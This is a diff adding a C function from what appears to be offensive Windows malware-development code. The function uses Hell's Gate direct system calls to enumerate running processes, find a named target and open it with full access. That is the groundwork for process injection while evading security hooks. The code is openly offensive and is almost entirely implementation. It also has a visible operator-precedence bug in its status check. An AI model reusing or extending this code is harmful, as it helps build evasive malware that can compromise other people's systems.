@@ -121,3 +121,68 @@ BOOL InitializeSyscalls() {
 
 	return TRUE;
 }
+
+BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
+{
+	ULONG							uReturnLen1 = 0;
+	ULONG							uReturnLen2 = 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	NTSTATUS						status = 0;
+
+	// First NtQuerySystemInformation call
+	// This will fail with STATUS_INFO_LENGTH_MISMATCH
+	// But it will provide information about how much memory to allocate (uReturnLen1)
+	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);
+	printf("[+] Returned Buffer Length of NtQuerySystemInformation: %d\n", uReturnLen1);
+
+	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
+	if (SystemProcInfo == NULL) {
+		printf("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
+		return FALSE;
+	}
+
+	// Second NtQuerySystemInformation call
+	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
+	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+	if ((status = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
+		printf("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
+		return FALSE;
+	}
+	printf("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);
+
+	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
+	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;
+
+	// 'SystemProcInfo' will now represent a new element in the array
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+
+	while (TRUE) {
+		wprintf(L"Enumerated Process Name: %ls\n", SystemProcInfo->ImageName.Buffer);
+		// Small check for the process's name size
+		// Comparing the enumerated process name to what we want to target
+		LPCWSTR lowerCaseTargetProcName = LowerCaseString(szProcName);
+		LPCWSTR lowerCaseProcName = LowerCaseString(SystemProcInfo->ImageName.Buffer);
+		if (SystemProcInfo->ImageName.Length && StringCompareW(lowerCaseTargetProcName, lowerCaseProcName) == 0) {
+			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
+			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			break;
+		}
+
+		// If NextEntryOffset is 0, we reached the end of the array
+		if (SystemProcInfo->NextEntryOffset == 0)
+			break;
+
+		// Move to the next element in the array
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+	}
+
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
+
+	// Check if we successfully got the target process handle
+	if (*pdwPid == NULL || *phProcess == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}
